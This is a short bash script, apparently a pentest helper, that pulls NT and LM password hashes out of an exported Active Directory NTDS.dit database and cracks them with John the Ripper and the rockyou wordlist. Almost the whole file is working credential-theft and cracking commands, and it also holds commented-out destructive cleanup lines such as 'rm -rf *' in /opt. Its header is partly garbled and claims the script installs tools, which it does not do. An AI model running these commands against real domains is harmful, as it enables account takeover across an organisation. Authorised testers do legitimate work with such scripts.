#!/bin/bash

# Windows Server 2012/2016 AD Password Cracker script Part II.
# Jan 2017, M. Long
#
# This script automates the process of installing several necessary tools into Kali Linux 2016.2012/2016
# Credit for most of this to: http://hackers-workshop.net/how-to-install-smbexec2-on-kali-linux
cd ~

python /opt/NTDSXtract/dsusers.py /root/ntds.dit.export/datatable.4 /root/ntds.dit.export/link_table.6 /root/hash --syshive /root/SYSTEM --passwordhashes --lmoutfile /root/lm-out.txt --ntoutfile /root/nt-out.txt --pwdformat john

#Clean up some space  - DANGER.  Only uncomment the below if you know what you're doing..
#cd ~
#rm -rf ntds.dit.export/
#rm -rf ntds.dit 
#cd /opt
#rm -rf *

gunzip /usr/share/wordlists/rockyou.txt.gz 
mv /usr/share/wordlists/rockyou.txt .
john --wordlist=rockyou.txt nt-out.txt --format=nt

